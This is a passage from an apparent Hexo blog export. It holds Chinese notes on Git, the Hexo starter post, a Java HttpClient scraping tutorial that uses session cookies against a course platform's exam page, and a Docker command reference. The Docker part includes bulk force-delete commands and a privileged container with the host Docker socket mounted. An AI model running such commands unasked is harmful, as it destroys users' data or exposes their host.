<p>提前创建好和远程分支名同名的分支（需要在第③步之前完成该操作）</p>
</blockquote>
<p><strong>绑定远程仓库：</strong><code>git remote add 名称 地址</code></p>
<p><strong>拉取最新版本(merge)：</strong><code>git pull --rebase 名称 分支</code></p>
<blockquote>
<p>注意：合并是将相同分支名的分支进行合并的</p>
</blockquote>
<p><strong>提交到暂存区：</strong><code>git add .</code>  <code>git commit -m &quot;备注&quot;</code></p>
<p><strong>push到远程仓库：</strong><code>git push -u 名称 分支</code> </p>
<blockquote>
<p>分支需要本地和远程的分支名一样（即远程有与本地同名的分支）</p>
</blockquote>
<p><em>更多命令见我OneNote笔记</em></p>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/02/13/hello-world/</url>
    <content><![CDATA[<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>java-使用HttpClient爬虫</title>
    <url>/2022/04/27/java-%E4%BD%BF%E7%94%A8HttpClient%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><span id="more"></span>

<p>使用的工具为Httpclient<br>主要分为两种：1、不需要登录就能访问的网页        2、需要登录才可以访问的网页</p>
<p>1、不需要登录的网页<br>    ①构建浏览器<br>    ②确定访问的uri<br>    ③获取到响应并解析</p>
<p>2、需要登录才可以访问的网页<br>    ①构建浏览器<br>    ②获取cookie（一般情况下只需要cookie，有的时候还需要其他的请求头，例如<code>authorization</code>请求头）<br>           第一种：静态获取：直接在浏览器中复制即可（有时候cookie没有用，换一个浏览器可能可以）<br>           第二种：模拟程序获取：如果不知道登录的请求uri和参数，可以先在浏览器中输入错误的账号、密码，得到用于登录的请求uri以及需要提交的表单的参数；<br>                                    然后在程序中想这个uri提交正确的表单，得到response，并得到Cookie<br>    ③按照浏览器中这个网址指定的请求方式，在程序中确定正式网页的请求uri和请求方式<br>    ④添加必要的几个请求头（例如Cookie、User-Agent等）<br>    ⑤获取到响应，并解析</p>
<p>完工！</p>
<h2 id="简单的HttpClient使用模板"><a href="#简单的HttpClient使用模板" class="headerlink" title="简单的HttpClient使用模板"></a>简单的HttpClient使用模板</h2><blockquote>
<p>如果是采用模拟程序获取Cookie的话，通常是显示用Post提交表单，获取到Cookie，然后在通过Get方式携带Cookie，爬取到想要的网页信息</p>
</blockquote>
<h3 id="Get方式请求"><a href="#Get方式请求" class="headerlink" title="Get方式请求"></a>Get方式请求</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 三步走：</span></span><br><span class="line"><span class="comment"> * ①创建CloseableHttpClient对象，作为客户端</span></span><br><span class="line"><span class="comment"> * ②创建HttpGet响应（先创建URIBuilder对象，再设置参数，参数设置结束后就创建HttpGet对象）</span></span><br><span class="line"><span class="comment"> * ③获取CloseableResponse响应</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * ④开始解析响应</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpGetParamTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ① 创建HttpClient对象</span></span><br><span class="line">        CloseableHttpClient httpClient = HttpClients.createDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置请求的地址是：http://yun.itheima.com/search?key=java</span></span><br><span class="line">        <span class="comment">// ②① 创建URIBuilder</span></span><br><span class="line">        URIBuilder uriBuilder = <span class="keyword">new</span> URIBuilder(<span class="string">&quot;https://mooc1.chaoxing.com/exam/test/reVersionPaperMarkContentNew?courseId=222650590&quot;</span> +</span><br><span class="line">                                               <span class="string">&quot;&amp;classId=50617144&amp;p=1&amp;id=57211393&amp;ut=s&amp;cpi=95361626&amp;newMooc=true&amp;openc=cfd40dfe5645b94bd7f0740626b30614&quot;</span>);</span><br><span class="line">        <span class="comment">// ②② 设置参数</span></span><br><span class="line">        <span class="comment">//uriBuilder.setParameter(&quot;courseId&quot;, &quot;222650590&quot;);//可以添加多个setParameter()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ③ 创建HttpGet对象，设置URL访问地址</span></span><br><span class="line">        HttpGet httpGet = <span class="keyword">new</span> HttpGet(uriBuilder.build());</span><br><span class="line">        <span class="comment">// ④ 如果是需要登录的网页的内容，则需要添加Cookie头的信息（注意：有时候edge对应的Cookie没有用，比如这一次的就是用的ie浏览器中展示出来的Cookie值）</span></span><br><span class="line">        httpGet.addHeader(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;两种方式获取到的Cookie&quot;</span>);</span><br><span class="line"></span><br><span class="line">        httpGet.addHeader(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100&quot;</span> +</span><br><span class="line">                          <span class="string">&quot;.0.4896.127 Safari/537.36 Edg/100.0.1185.50&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⑤ 使用HttpClient发起请求，获取response</span></span><br><span class="line">        CloseableHttpResponse response = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response = httpClient.execute(httpGet);</span><br><span class="line">            <span class="comment">//解析响应</span></span><br><span class="line">            <span class="keyword">if</span> (response.getStatusLine().getStatusCode() == <span class="number">200</span>) &#123;</span><br><span class="line">                String content = EntityUtils.toString(response.getEntity(), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                System.out.println(content);</span><br><span class="line">                System.out.println(WriteToFile.write(content));</span><br><span class="line">                <span class="comment">//                System.out.println(content.length());</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//关闭Response</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//关闭HttpClient</span></span><br><span class="line">                httpClient.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Post方式请求"><a href="#Post方式请求" class="headerlink" title="Post方式请求"></a>Post方式请求</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 带参数的POST请求，四步走：</span></span><br><span class="line"><span class="comment"> * ①创建CloseableHttpClient客户端</span></span><br><span class="line"><span class="comment"> * ②创建HttpPost对象（声明一个List集合——&gt;存放参数NameValuePair类型——&gt;使用该List集合创建表单实体UrlEncodedFormEntity对象——&gt;设置表单的Entity对象到Post</span></span><br><span class="line"><span class="comment"> * 请求当中——&gt;构建出HttpPost对象）</span></span><br><span class="line"><span class="comment"> * ③获取CloseableHttpResponse响应</span></span><br><span class="line"><span class="comment"> * ④解析响应，获取content（String类型）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpPostParamTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</span><br><span class="line">        <span class="comment">//创建HttpClient对象</span></span><br><span class="line">        CloseableHttpClient httpClient = HttpClients.createDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建HttpPost对象，设置URL访问地址</span></span><br><span class="line">        HttpPost httpPost = <span class="keyword">new</span> HttpPost(<span class="string">&quot;https://mooc1.chaoxing.com/exam/test/reVersionPaperMarkContentNew&quot;</span>);</span><br><span class="line">        <span class="comment">//声明List集合，封装表单中的参数</span></span><br><span class="line">        List&lt;NameValuePair&gt; params = <span class="keyword">new</span> ArrayList&lt;NameValuePair&gt;();        <span class="comment">//post发送构造函数只接受List&lt;? extends</span></span><br><span class="line">        <span class="comment">// NameValuePair&gt;为参数，所以不能使用map</span></span><br><span class="line">        params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;courseId&quot;</span>, <span class="string">&quot;222650590&quot;</span>));</span><br><span class="line">        params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;cpi&quot;</span>, <span class="string">&quot;95361626&quot;</span>));</span><br><span class="line">        params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;newMooc&quot;</span>, <span class="string">&quot;true&quot;</span>));</span><br><span class="line">        params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;openc&quot;</span>, <span class="string">&quot;cfd40dfe5645b94bd7f0740626b30614&quot;</span>));</span><br><span class="line">        <span class="comment">//创建表单的Entity对象，第一个参数是表单，第二个参数是编码</span></span><br><span class="line">        UrlEncodedFormEntity formEntity = <span class="keyword">new</span> UrlEncodedFormEntity(params, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="comment">//设置表单的Entity的对象到Post请求中</span></span><br><span class="line">        httpPost.setEntity(formEntity);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用HttpClient发起请求，获取response</span></span><br><span class="line">        CloseableHttpResponse response = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response = httpClient.execute(httpPost);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//解析响应</span></span><br><span class="line">            <span class="keyword">if</span> (response.getStatusLine().getStatusCode() == <span class="number">200</span>) &#123;      <span class="comment">//状态码200表示请求成功</span></span><br><span class="line">                String content = EntityUtils.toString(response.getEntity(), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;========================响应数据长度：&quot;</span> + content.length());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//关闭Response</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//关闭httpClient</span></span><br><span class="line">                httpClient.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>HttpClient</tag>
      </tags>
  </entry>
  <entry>
    <title>docker使用入门文档</title>
    <url>/2023/06/25/docker%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="Linux下的命令"><a href="#Linux下的命令" class="headerlink" title="Linux下的命令"></a>Linux下的命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 开、关docker-desktop（非必要，因为docker-desktop集成了docker服务）</span></span><br><span class="line">systemctl --user start docker-desktop	<span class="comment"># 启动docker-desktop</span></span><br><span class="line">systemctl --user <span class="built_in">enable</span> docker-desktop	<span class="comment"># 开启自动启动</span></span><br><span class="line">systemctl --user stop docker-desktop	<span class="comment"># 关闭docker-desktop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开、关docker（docker服务必须开启）</span></span><br><span class="line">systemctl start docker	<span class="comment"># 启动docker服务</span></span><br><span class="line">service docker start	<span class="comment"># 效果同上</span></span><br><span class="line">systemctl stop docker 	<span class="comment"># 停止docker服务</span></span><br><span class="line">service docker stop		<span class="comment"># 效果同上</span></span><br><span class="line">systemctl restart docker	<span class="comment"># 重启docker服务</span></span><br><span class="line">service docker restart		<span class="comment"># 效果同上</span></span><br><span class="line"><span class="comment"># docker服务状态</span></span><br><span class="line">systemctl status docker		<span class="comment"># 查看docker服务状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统日志</span></span><br><span class="line">journalctl -xe	<span class="comment"># 查看系统日志</span></span><br><span class="line">	<span class="comment"># -x 相关目录（如：问题相关的网址）</span></span><br><span class="line">	<span class="comment"># -e`从结尾开始看（默认从正序从开头看）</span></span><br><span class="line">	<span class="comment"># -r 倒序查看（默认从正序从开头看）</span></span><br></pre></td></tr></table></figure>

<h2 id="Window下的命令"><a href="#Window下的命令" class="headerlink" title="Window下的命令"></a>Window下的命令</h2><p>windows下的docker服务需要运行docker-desktop</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">wsl -l -v		<span class="comment"># 查看所有linux子系统的执行状态和版本</span></span><br></pre></td></tr></table></figure>

<h2 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.版本</span></span><br><span class="line">docker compose version</span><br><span class="line">docker --version</span><br><span class="line">docker version</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 2.镜像</span></span><br><span class="line">docker images	 <span class="comment"># 查看所有镜像文件</span></span><br><span class="line">docker images	-a 	<span class="comment"># 或者--all，显示所有镜像文件</span></span><br><span class="line">docker images	-q	<span class="comment"># 或者--quit，仅显示镜像id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.搜索</span></span><br><span class="line">docker search 镜像地址名称  [--filter=STARS=3000]   	<span class="comment"># 搜索镜像[搜索出来的镜像就是stars大于3000的]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.拉取</span></span><br><span class="line">docker pull镜像的仓库源[:tag]	   	<span class="comment"># 下载镜像（不指定tag时为latest版本）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.删除镜像</span></span><br><span class="line">docker rmi -f 镜像id          	 <span class="comment"># 删除指定的镜像</span></span><br><span class="line">docker rmi -f 镜像id 镜像id 镜像id    <span class="comment"># 删除多个镜像（空格分隔）</span></span><br><span class="line">docker rmi -f $(docker images -aq)    <span class="comment"># 删除全部的镜像</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 容器 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.创建、启动</span></span><br><span class="line">docker run [可选参数] 镜像id|镜像名[:tag] [<span class="built_in">command</span> [args]]		<span class="comment"># 选择一个镜像，先创建一个容器，再启动该容器（容器运行后可选择执行命令）		★启动的运行方式一经确定，便不可更改（守护模式还是交互模式只能在run时候确定（即使停止了重启也不会改变））</span></span><br><span class="line">	<span class="comment"># --name=&quot;名字&quot;		指定容器的名称</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># -d			 	 ★后台方式运行该容器（是守护模式，执行exit后，不会终止容器）（最后不要加上/bin/bash）</span></span><br><span class="line">	<span class="comment"># -it			 	 ★使用交互方式运行，并创建一个伪终端，查看容器内容（是交互模式，执行exit后会终止容器）（此时命令最后最好加上/bin/bash）</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># -p ip:主机端口:容器端口   		配置主机端口映射到容器端口</span></span><br><span class="line">    <span class="comment"># -p 主机端口:容器端口				配置主机端口映射到容器端口</span></span><br><span class="line">    <span class="comment"># -p 容器端口					   配置主机端口映射到容器端口</span></span><br><span class="line">    <span class="comment"># -P 				  大写P，随机分配一个主机的端口</span></span><br><span class="line"><span class="comment">## 例</span></span><br><span class="line">docker run -d 镜像名		 <span class="comment"># 后台启动</span></span><br><span class="line">curl localhost:主机端口		<span class="comment"># 容器运行后，本机测试访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.退出</span></span><br><span class="line"><span class="built_in">exit</span>		<span class="comment"># 容器中有终端未关闭，则退出时仅关闭容器中的终端，不关闭容器；否则退出时，容器也将终止</span></span><br><span class="line">CTRL+P后CTRL+Q	<span class="comment"># 不关闭容器中的终端退出容器（容器中的终端不关闭，因此容器也不关闭）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.列表</span></span><br><span class="line">docker ps	<span class="comment"># 当前正在运行的容器</span></span><br><span class="line">	<span class="comment"># -a	# 所有容器的信息</span></span><br><span class="line">	<span class="comment"># -n=？ # 最近创建的n个容器（default -1）</span></span><br><span class="line">	<span class="comment"># -q	# 仅显示容器id</span></span><br><span class="line">	<span class="comment"># -s	# 总文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.删除</span></span><br><span class="line">docker rm 容器id		<span class="comment"># 删除容器（只有删除容器，数据才会删除）</span></span><br><span class="line">docker rm -f $(docker ps -aq)		<span class="comment"># 删除所有容器</span></span><br><span class="line">docker ps -a -q | xrags docker rm	<span class="comment"># 删除所有容器（竖线表示前面的结果作为后面的输入）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.启动</span></span><br><span class="line">docker start 容器id		<span class="comment"># 停止</span></span><br><span class="line">docker restart 容器id		<span class="comment"># 重启</span></span><br><span class="line">docker stop 容器id		<span class="comment"># 停止</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器id		<span class="comment"># 强制停止</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.进容器</span></span><br><span class="line">docker <span class="built_in">exec</span> [options] container <span class="built_in">command</span> [args]		<span class="comment"># 进入正在运行的容器中</span></span><br><span class="line">	<span class="comment"># -d		分离模式：在后台运行</span></span><br><span class="line">	<span class="comment"># -i		交互模式，如果不加，则无法与用户交互（一般-it一块使用）</span></span><br><span class="line">	<span class="comment"># -t		分配一个伪终端，如果不加，则没有终端（一般-it一块使用）</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 容器id /bin/bash		  <span class="comment"># 进入容器后开启一个新的终端，在其中操作（是守护模式，执行exit后不会终止容器）</span></span><br><span class="line">docker attach [options] container	   <span class="comment"># 进入容器上次的终端（且是交互模式，执行exit后会终止容器）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.容器中进程</span></span><br><span class="line">docker top 容器id			<span class="comment"># 容器中进程信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.元数据</span></span><br><span class="line">docker inspect [options] 容器name|镜像name	<span class="comment"># 容器或者镜像的元数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 日志 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志</span></span><br><span class="line">docker logs 参数 容器名/容器id</span><br><span class="line">	<span class="comment"># --details 			显示提供给日志的其他详细信息</span></span><br><span class="line">	<span class="comment"># --follow , -f 		实时跟踪日志输出</span></span><br><span class="line">	<span class="comment"># --since 				显示自某个timestamp之后的日志大于等于某个时间，或相对时间，如1h 就是1h）</span></span><br><span class="line">	<span class="comment"># --tail n				从末尾显示n条</span></span><br><span class="line">	<span class="comment"># -n  m或all 			m数，默认值为all 全部</span></span><br><span class="line">	<span class="comment"># --timestamps , -t 	日志每行显示日志时间戳</span></span><br><span class="line">	<span class="comment"># --until 				显示自某个timestamp之前的日志小于等于某个时间，或相对时间，如30m（即30分钟）</span></span><br><span class="line"><span class="comment">## 例</span></span><br><span class="line">docker logs -tf --tail 10 容器id		<span class="comment"># 倒序显示指定容器实时10条日志，每条带有时间戳</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 其他指令 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝</span></span><br><span class="line">docker cp 容器id:容器内路径 目的主机路径		<span class="comment"># 拷贝容器的文件到主机中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建镜像</span></span><br><span class="line">docker commit [options] container [repository:tag]		<span class="comment"># 提交指定容器成为一个新的副本</span></span><br><span class="line"><span class="comment">## 例</span></span><br><span class="line">docker commit -m=<span class="string">&quot;描述信息，类似git的提交信息&quot;</span> -a=<span class="string">&quot;作者&quot;</span> 容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="坑1：启动容器，自动停止"><a href="#坑1：启动容器，自动停止" class="headerlink" title="坑1：启动容器，自动停止"></a>坑1：启动容器，自动停止</h3><p><strong>可能1</strong>：docker容器使用后台运行，就必须要有一个<strong>前台进程</strong>，docker发现没有应用了，就会自动停止 。例如：nginx，容器启动后发现自己没有<strong>提供服务</strong>，就会立刻停止，就是没有程序了。</p>
<p><strong>可能2</strong>：<code>docker run -d …</code>最后面加了<code>/bin/bash</code></p>
<blockquote>
<p> <strong>解决方案1</strong>：一般<code>-it</code>启动的时候后面会有一个<code>/bin/bash</code>。</p>
</blockquote>
<blockquote>
<p><strong>解决方案2</strong>：父容器进程可能有一个子进程（即一个容器可能是一组进程）。</p>
</blockquote>
<blockquote>
<p><strong>例如Nginx容器启动</strong>：当我们启动一个nginx服务时，它会启动一个父Nginx进程，然后父进程跨越进它的子进程，比如内存管理器、缓存加载器和工作器。</p>
</blockquote>
<h3 id="坑2：执行exit是否终止容器"><a href="#坑2：执行exit是否终止容器" class="headerlink" title="坑2：执行exit是否终止容器"></a>坑2：执行exit是否终止容器</h3><p>先进后出：</p>
<table>
<thead>
<tr>
<th>退出方式</th>
<th>exec进入方式（进入守护模式，同守护模式启动）</th>
<th>attach进入方式（进入非守护模式）</th>
</tr>
</thead>
<tbody><tr>
<td>exit退出方式</td>
<td>容器还在</td>
<td>容器不在</td>
</tr>
<tr>
<td>ctrl+p+q退出方式（一定不终止容器）</td>
<td>容器还在</td>
<td>容器还在</td>
</tr>
</tbody></table>
<h3 id="坑3：执行docker-attach卡住"><a href="#坑3：执行docker-attach卡住" class="headerlink" title="坑3：执行docker attach卡住"></a>坑3：执行docker attach卡住</h3><p>先出后进：<code>docker attach</code>能否成功进入容器，取决于容器在<code>run</code>启动时是<strong>交互模式</strong>还是<strong>守护模式</strong>启动的</p>
<h2 id="常用Docker工具"><a href="#常用Docker工具" class="headerlink" title="常用Docker工具"></a>常用Docker工具</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.Docker UI</span></span><br><span class="line">docker search dockerui</span><br><span class="line">docker pull abh1nav/dockerui</span><br><span class="line">docker run -d --privileged --name dockerui -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock abh1nav/dockerui		<span class="comment">#放开物理机的9000端口对应Docker容器的9000端口</span></span><br><span class="line">curl localhost:9000			<span class="comment"># 访问地址：http://ip地址:9000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.Portainer</span></span><br><span class="line">docker search portainer</span><br><span class="line">docker pull portainer/portainer</span><br><span class="line">docker run -d --name portainerUI -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer</span><br><span class="line">curl localhost:9000			<span class="comment"># 访问地址：http://ip地址:9000</span></span><br></pre></td></tr></table></figure>

<h2 id="常见容器案例"><a href="#常见容器案例" class="headerlink" title="常见容器案例"></a>常见容器案例</h2><h3 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="1.Nginx"></a>1.Nginx</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search nginx				<span class="comment"># 查找镜像</span></span><br><span class="line">docker pull nginx				<span class="comment"># 下载镜像</span></span><br><span class="line">docker run -d --name nginx -p 3344:80 nginx		<span class="comment"># 创建并在后台运行容器</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it nginx /bin/bash		<span class="comment"># 进入容器</span></span><br></pre></td></tr></table></figure>

<h3 id="2-Tomcat"><a href="#2-Tomcat" class="headerlink" title="2.Tomcat"></a>2.Tomcat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull tomcat 			<span class="comment"># 下载镜像</span></span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat	<span class="comment"># 后台启动</span></span><br><span class="line">docker <span class="built_in">exec</span> -it tomcat01 /bin/bash		<span class="comment"># 进入容器</span></span><br><span class="line"><span class="comment"># webapps下内容为空，阿里云默认时最小的镜像，所有不必要的都剔除了</span></span><br><span class="line"><span class="comment"># 保证最小运行环境即可</span></span><br><span class="line">cp -r webapps.dist/* webapps	<span class="comment"># 网站恢复访问</span></span><br></pre></td></tr></table></figure>

<h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>数据持久化</li>
<li>容器之间共享数据</li>
</ul>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li>生命周期：数据卷存在于宿主机的文件系统中，独立于容器，和容器的生命周期分离</li>
<li>存在形式：目录或文件</li>
<li>作用域：<ul>
<li>容器和数据卷的数据变化<strong>实时同步</strong>发生。</li>
<li>数据卷的数据变换不影响镜像变化</li>
</ul>
</li>
<li>挂载时：<ul>
<li>数据卷空，容器中目录非空，则容器中数据复制到数据卷中</li>
<li>数据卷不空，容器中目录非空，则显示数据卷内容，容器目录仅显示数据卷中数据，其余被隐藏</li>
</ul>
</li>
</ol>
<h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------------ 方式1：在docker run基础上，使用命令来挂载 -v ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -it -v 主机目录:容器内目录 container [<span class="built_in">command</span>] [args]</span><br><span class="line">	<span class="comment"># -v 容器内路径 		 			匿名挂载</span></span><br><span class="line">	<span class="comment"># -v 卷名:容器内路径	           具名挂载</span></span><br><span class="line">	<span class="comment"># -v /宿主机路径:容器内路径  	 指定路径挂载</span></span><br><span class="line"><span class="comment"># 挂载</span></span><br><span class="line">docker run -d -P --name nginx01 -v 容器内目录 container [<span class="built_in">command</span>] [args]	<span class="comment"># 匿名挂载，只写了容器内的路径，没有写容器外的路径</span></span><br><span class="line">docker run -d -P --name nginx01 -v [主机目录|主机文件名]:容器内目录 container [<span class="built_in">command</span>] [args]		<span class="comment"># 具名挂载</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据卷</span></span><br><span class="line">docker volume ls	<span class="comment"># 查看所有volume</span></span><br><span class="line">docker volume inspect [options] volume [volume2…]	<span class="comment"># 查看指定的数据卷的信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 没有指定目录（即使用主机文件名）时，数据在/var/lib/docker/volumes/xxxx/_data</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 方式2：使用DockerFile来挂载 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步准备：创建文件dockerfile1，vim输入内容如下：</span></span><br><span class="line">from centos</span><br><span class="line">volume [<span class="string">&quot;volume01&quot;</span>,<span class="string">&quot;volume01&quot;</span>]		<span class="comment"># ★匿名挂载。在构建镜像时，生成这两个目录，并自动挂载到宿主机的数据卷目录中</span></span><br><span class="line">cmd <span class="built_in">echo</span> <span class="string">&quot;-----end-----&quot;</span></span><br><span class="line">cmd /bin/bash</span><br><span class="line"><span class="comment"># 以上一层代表一层镜像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：build镜像</span></span><br><span 